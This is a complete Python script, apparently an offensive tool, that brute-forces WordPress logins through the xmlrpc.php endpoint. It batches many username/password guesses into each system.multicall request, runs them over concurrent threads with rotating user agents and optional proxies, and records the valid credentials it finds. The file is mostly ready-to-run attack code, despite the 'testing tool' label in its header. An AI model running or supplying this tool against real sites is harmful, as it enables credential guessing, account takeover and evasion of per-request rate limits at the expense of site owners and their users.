#!/usr/bin/env python3
"""
WordPress XML-RPC Authentication Testing Tool
Author: baba01hacker
Version: 3.0 (Multicall & Concurrency Enabled)
"""

import requests
import argparse
import sys
import time
import random
import signal
from typing import List, Dict, Optional, Tuple, Any
from xml.etree import ElementTree as ET
import urllib3
from concurrent.futures import ThreadPoolExecutor, as_completed
from datetime import datetime

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Configuration ---
BATCH_SIZE = 50  # Number of passwords to test per single HTTP request (Multicall)
MAX_THREADS = 10 # Number of concurrent HTTP requests

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "WordPress/6.2; http://example.com"
]

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    CYAN = '\033[96m'
    MAGENTA = '\033[95m'
    RESET = '\033[0m'
    BOLD = '\033[1m'

class XMLRPCTester:
    def __init__(self, target_url: str, verify_ssl: bool = True, 
                 proxy: Optional[Dict] = None, verbose: bool = False):
        self.target_url = target_url.rstrip('/')
        self.xmlrpc_endpoint = f"{self.target_url}/xmlrpc.php"
        self.verify_ssl = verify_ssl
        self.proxy = proxy
        self.verbose = verbose
        self.session = requests.Session()
        self.found_credentials = []
        
        # Setup session headers
        self.session.headers.update({
            'User-Agent': random.choice(USER_AGENTS),
            'Content-Type': 'application/xml',
            'Accept': '*/*'
        })

    def _log(self, msg: str, level: str = "INFO"):
        """Centralized logger"""
        timestamp = datetime.now().strftime("%H:%M:%S")
        if level == "INFO":
            print(f"[{timestamp}] {Colors.BLUE}[*]{Colors.RESET} {msg}")
        elif level == "SUCCESS":
            print(f"[{timestamp}] {Colors.GREEN}[+]{Colors.RESET} {msg}")
        elif level == "ERROR":
            print(f"[{timestamp}] {Colors.RED}[-]{Colors.RESET} {msg}")
        elif level == "DEBUG" and self.verbose:
            print(f"[{timestamp}] {Colors.YELLOW}[DEBUG]{Colors.RESET} {msg}")

    def check_xmlrpc_enabled(self) -> bool:
        """
        Check if XML-RPC is enabled using a valid POST request.
        Fixed from previous version (GET -> POST).
        """
        payload = """<?xml version="1.0" encoding="utf-8"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>"""
        
        try:
            self._log(f"Checking endpoint: {self.xmlrpc_endpoint}", "DEBUG")
            response = self.session.post(
                self.xmlrpc_endpoint,
                data=payload,
                verify=self.verify_ssl,
                proxies=self.proxy,
                timeout=10
            )
            
            # Check for valid XML-RPC response structure
            if response.status_code == 200 and ('<methodResponse>' in response.text or '<fault>' in response.text):
                self._log("XML-RPC endpoint is active and responding.", "SUCCESS")
                return True
            
            elif response.status_code == 405:
                self._log("XML-RPC endpoint exists but Method Not Allowed (405).", "ERROR")
            elif response.status_code == 403:
                self._log("XML-RPC endpoint is forbidden (403) - WAF/Plugin active.", "ERROR")
            else:
                self._log(f"XML-RPC check failed. Status: {response.status_code}", "ERROR")
            
            return False
            
        except requests.exceptions.RequestException as e:
            self._log(f"Connection failed: {e}", "ERROR")
            return False

    def check_multicall_enabled(self) -> bool:
        """Check if system.multicall is supported (Crucial for speed)"""
        payload = """<?xml version="1.0"?>
<methodCall>
  <methodName>system.listMethods</methodName>
  <params></params>
</methodCall>"""
        try:
            response = self.session.post(self.xmlrpc_endpoint, data=payload, 
                                       verify=self.verify_ssl, proxies=self.proxy, timeout=10)
            if 'system.multicall' in response.text:
                self._log("system.multicall is AVAILABLE (Fast mode enabled)", "SUCCESS")
                return True
            else:
                self._log("system.multicall NOT found. Falling back to slow mode.", "YELLOW")
                return False
        except:
            return False

    def _build_multicall_payload(self, pairs: List[Tuple[str, str]]) -> str:
        """Constructs a single XML payload containing multiple authentication attempts"""
        calls = ""
        for user, password in pairs:
            call_xml = f"""
            <value><struct>
                <member><name>methodName</name><value><string>wp.getUsersBlogs</string></value></member>
                <member><name>params</name><value><array><data>
                    <value><string>{user}</string></value>
                    <value><string>{password}</string></value>
                </data></array></value></member>
            </struct></value>"""
            calls += call_xml

        return f"""<?xml version="1.0"?>
<methodCall>
  <methodName>system.multicall</methodName>
  <params><param><value><array><data>
    {calls}
  </data></array></value></param></params>
</methodCall>"""

    def process_batch(self, batch_pairs: List[Tuple[str, str]]) -> List[Tuple[str, str]]:
        """Sends a single multicall request and parses results"""
        payload = self._build_multicall_payload(batch_pairs)
        valid_creds = []
        
        try:
            response = self.session.post(
                self.xmlrpc_endpoint,
                data=payload,
                verify=self.verify_ssl,
                proxies=self.proxy,
                timeout=20
            )
            
            if response.status_code != 200:
                self._log(f"Batch failed with status {response.status_code}", "ERROR")
                return []

            # Basic parsing of the response
            # Note: A real parser would be safer, but for speed/simplicity in CTFs we scan text
            # However, for multicall we need to map responses back to requests index
            
            # Simple heuristic: If we see 'isAdmin' or 'blogName' it implies success.
            # But to know WHICH user succeeded in a batch, we must parse carefully.
            # In XML-RPC multicall, the response is an array of responses in the SAME order.
            
            try:
                root = ET.fromstring(response.content)
                # The structure is <methodResponse><params><param><value><array><data> <value>RESPONSE</value> ...
                responses = root.findall(".//data/value")
                
                # Check if we got the same number of responses as requests
                if not responses: 
                    # Sometimes the path is different depending on WP version
                     responses = root.findall(".//params/param/value/array/data/value")

                for i, resp_element in enumerate(responses):
                    if i >= len(batch_pairs): break
                    
                    resp_string = ET.tostring(resp_element, encoding='unicode')
                    
                    # Logic: A fail is usually a <fault> struct. A success is a standard struct/array.
                    if "<fault>" not in resp_string and ("isAdmin" in resp_string or "url" in resp_string or "blogName" in resp_string):
                        username, password = batch_pairs[i]
                        self._log(f"FOUND: {username}:{password}", "SUCCESS")
                        valid_creds.append((username, password))
                        
            except ET.ParseError:
                self._log("XML Parse Error in batch response", "DEBUG")

        except Exception as e:
            self._log(f"Batch Error: {e}", "DEBUG")
            
        return valid_creds

    def attack_multicall(self, user_pass_pairs: List[Tuple[str, str]]):
        """Orchestrates the threaded multicall attack"""
        total_pairs = len(user_pass_pairs)
        self._log(f"Starting Multicall Attack on {total_pairs} combinations")
        
        # Split into batches
        batches = [user_pass_pairs[i:i + BATCH_SIZE] for i in range(0, total_pairs, BATCH_SIZE)]
        self._log(f"Split into {len(batches)} batches (Size: {BATCH_SIZE}) running on {MAX_THREADS} threads")
        
        start_time = time.time()
        
        with ThreadPoolExecutor(max_workers=MAX_THREADS) as executor:
            future_to_batch = {executor.submit(self.process_batch, batch): batch for batch in batches}
            
            completed_batches = 0
            for future in as_completed(future_to_batch):
                completed_batches += 1
                try:
                    results = future.result()
                    if results:
                        self.found_credentials.extend(results)
                    
                    # Progress indicator
                    if completed_batches % 5 == 0 or completed_batches == len(batches):
                        progress = (completed_batches / len(batches)) * 100
                        elapsed = time.time() - start_time
                        self._log(f"Progress: {progress:.1f}% - Found: {len(self.found_credentials)}", "INFO")
                        
                except Exception as exc:
                    self._log(f"Thread generated an exception: {exc}", "ERROR")

    def run_legacy_attack(self, users, passwords):
        """Legacy 1-by-1 attack for servers without multicall"""
        self._log("Multicall not supported. Running legacy mode (Slow)", "YELLOW")
        # Simplified loop for legacy
        for u in users:
            for p in passwords:
                self.test_single_login(u, p)

    def test_single_login(self, username, password):
        """Single login test (Legacy mode)"""
        payload = f"""<?xml version="1.0" encoding="UTF-8"?>
<methodCall>
  <methodName>wp.getUsersBlogs</methodName>
  <params>
    <param><value><string>{username}</string></value></param>
    <param><value><string>{password}</string></value></param>
  </params>
</methodCall>"""
        try:
            response = self.session.post(self.xmlrpc_endpoint, data=payload, verify=self.verify_ssl, timeout=10)
            if response.status_code == 200 and ('isAdmin' in response.text or 'blogName' in response.text):
                self._log(f"FOUND: {username}:{password}", "SUCCESS")
                self.found_credentials.append((username, password))
        except:
            pass

# --- Helper Functions ---

def load_file(filepath: str) -> List[str]:
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            return [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Colors.RED}File not found: {filepath}{Colors.RESET}")
        sys.exit(1)

def save_results(creds, output_file):
    if not creds: return
    with open(output_file, 'w') as f:
        f.write(f"# Scan Date: {datetime.now()}\n")
        for u, p in creds:
            f.write(f"{u}:{p}\n")
    print(f"{Colors.GREEN}[+] Results saved to {output_file}{Colors.RESET}")

# --- Main ---

def main():
    parser = argparse.ArgumentParser(description='WordPress XML-RPC Multicall Attacker')
    parser.add_argument('-u', '--url', required=True, help='Target URL (e.g. https://site.com)')
    parser.add_argument('-U', '--user-file', help='Username list')
    parser.add_argument('-P', '--pass-file', help='Password list')
    parser.add_argument('--username', help='Single username')
    parser.add_argument('--password', help='Single password')
    parser.add_argument('-o', '--output', help='Output file')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--no-verify', action='store_true', help='Skip SSL verification')
    parser.add_argument('--proxy', help='Proxy (ip:port)')

    args = parser.parse_args()

    # Logo
    print(f"""{Colors.CYAN}
   _  __  __  __   _      ___  ___  ___ 
  | |/ / |  \/  | | |    | _ \| _ \/ __|
  | ' <  | |\/| | | |__  |   /|  _/ (__ 
  |_|\_\ |_|  |_| |____| |_|_\|_|  \___|
       XML-RPC Brute v3.0 by baba01hacker
    {Colors.RESET}""")

    # Setup
    proxy = {'http': args.proxy, 'https': args.proxy} if args.proxy else None
    tester = XMLRPCTester(args.url, verify_ssl=not args.no_verify, proxy=proxy, verbose=args.verbose)

    # 1. Connectivity Check
    if not tester.check_xmlrpc_enabled():
        sys.exit(1)

    # 2. Prepare Combinations
    users = []
    passwords = []

    if args.username: users.append(args.username)
    if args.user_file: users.extend(load_file(args.user_file))
    
    if args.password: passwords.append(args.password)
    if args.pass_file: passwords.extend(load_file(args.pass_file))

    if not users or not passwords:
        print(f"{Colors.RED}[!] You must provide users and passwords.{Colors.RESET}")
        sys.exit(1)

    # Generate all pairs
    # NOTE: If lists are huge, this list comprehension might eat RAM. 
    # For massive lists, a generator approach is better, but this suffices for typical usage.
    print(f"{Colors.BLUE}[*] Generating combinations for {len(users)} users and {len(passwords)} passwords...{Colors.RESET}")
    combinations = [(u, p) for u in users for p in passwords]
    
    # 3. Attack
    if tester.check_multicall_enabled():
        tester.attack_multicall(combinations)
    else:
        tester.run_legacy_attack(users, passwords)

    # 4. Finish
    if tester.found_credentials:
        print(f"\n{Colors.GREEN}{Colors.BOLD}=== FINAL RESULTS ==={Colors.RESET}")
        for u, p in tester.found_credentials:
            print(f"User: {u:<15} Pass: {p}")
        if args.output:
            save_results(tester.found_credentials, args.output)
    else:
        print(f"\n{Colors.YELLOW}[*] No credentials found.{Colors.RESET}")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{Colors.RED}[!] Interrupted by user{Colors.RESET}")
        sys.exit(0)
